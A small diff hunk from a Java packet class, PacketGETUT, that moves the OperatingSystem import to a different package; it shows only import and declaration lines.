@@ -3,7 +3,7 @@ package com.redpois0n.packets;
 import java.io.File;
 
 import com.redpois0n.Connection;
-import com.redpois0n.common.os.OperatingSystem;
+import com.redpois0n.common.OperatingSystem;
 
 public class PacketGETUT extends AbstractPacket {
 
